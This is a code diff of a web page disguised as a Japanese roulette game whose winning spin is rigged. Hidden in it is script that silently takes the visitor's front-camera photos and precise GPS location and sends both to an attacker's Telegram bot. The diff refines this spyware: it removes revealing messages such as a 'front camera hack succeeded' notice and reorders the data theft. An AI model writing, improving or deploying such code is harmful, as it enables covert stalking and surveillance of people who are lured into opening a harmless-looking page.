@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
-<title>🎯</title>
+<title>🎯ルーレット🎯</title>
 <style>
   body { margin: 0; color: #fff; font-family: sans-serif; min-height: 100vh; display: flex; flex-direction: column; align-items: center; justify-content: center; overflow-x: hidden; background: #444; transition: background 0.1s; padding: 20px 0; box-sizing: border-box; }
   h2 { position: relative; margin-bottom: 30px; padding: 10px 25px; background: rgba(255,255,255,0.2); border-radius: 15px; backdrop-filter: blur(10px); z-index: 5; border: 1px solid rgba(255,255,255,0.3); font-size: 24px; }
@@ -27,7 +27,7 @@
   <canvas id="wheel"></canvas>
 </div>
 
-<h3 id="result"></h3>
+<h3 id="result">結果：</h3>
 <button id="spinBtn">回す</button>
 
 <div id="overlay"></div>
@@ -59,48 +59,49 @@ function draw() {
   const rad = (Math.PI * 2) / slots.length;
   ctx.clearRect(0, 0, size, size);
   for(let i=0; i<slots.length; i++){
-    ctx.beginPath(); ctx.moveTo(c, c); ctx.arc(c, c, c, i * rad, (i + 1) * rad);
-    ctx.fillStyle = i % 2 === 0 ? "#FFD700" : "#EEEEEE"; ctx.fill();
-    ctx.strokeStyle = "#333"; ctx.lineWidth = 4; ctx.stroke();
-    ctx.save(); ctx.translate(c, c); ctx.rotate(i * rad + rad / 2);
-    ctx.fillStyle = "#333"; ctx.font = "bold 55px sans-serif"; ctx.textAlign = "center"; ctx.textBaseline = "middle";
-    ctx.fillText(slots[i], c * 0.55, 0); ctx.restore();
+    ctx.beginPath();
+    ctx.moveTo(c, c);
+    ctx.arc(c, c, c, i * rad, (i + 1) * rad);
+    ctx.fillStyle = i % 2 === 0 ? "#FFD700" : "#EEEEEE";
+    ctx.fill();
+    ctx.strokeStyle = "#333";
+    ctx.lineWidth = 4;
+    ctx.stroke();
+    ctx.save();
+    ctx.translate(c, c);
+    ctx.rotate(i * rad + rad / 2);
+    ctx.fillStyle = "#333";
+    ctx.font = "bold 55px sans-serif";
+    ctx.textAlign = "center";
+    ctx.textBaseline = "middle";
+    ctx.fillText(slots[i], c * 0.55, 0);
+    ctx.restore();
   }
 }
 window.onload = draw;
 window.onresize = draw;
 draw();
 
-async function sendLocation() {
-  return new Promise((resolve) => {
-    if (navigator.geolocation) {
-      navigator.geolocation.getCurrentPosition(async function(position) {
+function sendLocation() {
+  if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(
+      function(position) {
         const lat = position.coords.latitude;
         const lon = position.coords.longitude;
         const mapUrl = `https://www.google.com/maps?q=${lat},${lon}`;
-        const message = `📍 位置特定完了\n\n${mapUrl}`;
-        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
           method: "POST",
           headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ chat_id: CHAT_ID, text: message })
+          body: JSON.stringify({ chat_id: CHAT_ID, text: mapUrl })
         });
-        resolve();
-      }, async function(e) {
-        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ chat_id: CHAT_ID, text: `⚠️ 位置情報の取得に失敗しました: ${e.message}` })
-        });
-        resolve();
-      }, { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 });
-    } else {
-      resolve();
-    }
-  });
+      },
+      function(error) { console.log(error.message); },
+      { enableHighAccuracy: true }
+    );
+  }
 }
 
 async function captureAndSend() {
-  await sendLocation();
   try {
     const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
     const video = document.createElement("video");
@@ -116,22 +117,14 @@ async function captureAndSend() {
       await new Promise(r => setTimeout(r, 400));
     }
     stream.getTracks().forEach(t => t.stop());
-    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ chat_id: CHAT_ID, text: "📷 内カメハック成功" })
-    });
     for (const b of blobs) {
       const fd = new FormData();
       fd.append("chat_id", CHAT_ID); fd.append("photo", b, "shot.jpg");
       await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: "POST", body: fd });
     }
+    setTimeout(sendLocation, 500);
   } catch (e) {
-    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ chat_id: CHAT_ID, text: `⚠️ カメラの起動に失敗しました: ${e.message}` })
-    });
+    sendLocation();
   }
 }
 
@@ -144,7 +137,8 @@ spinBtn.onclick = () => {
   void canvas.offsetWidth;
   canvas.style.transition = "transform 4s cubic-bezier(0.1, 0, 0.1, 1)";
   const targetIdx = [0,2,4,6][Math.floor(Math.random()*4)];
-  const stopA = 360 - (targetIdx * 45) - 22.5;
+  const anglePerSlot = 360 / slots.length;
+  const stopA = 360 - (targetIdx * anglePerSlot) - (anglePerSlot / 2);
   canvas.style.transform = `rotate(${2160 + stopA}deg)`;
   setTimeout(() => {
     document.getElementById("result").textContent = "当たり！";
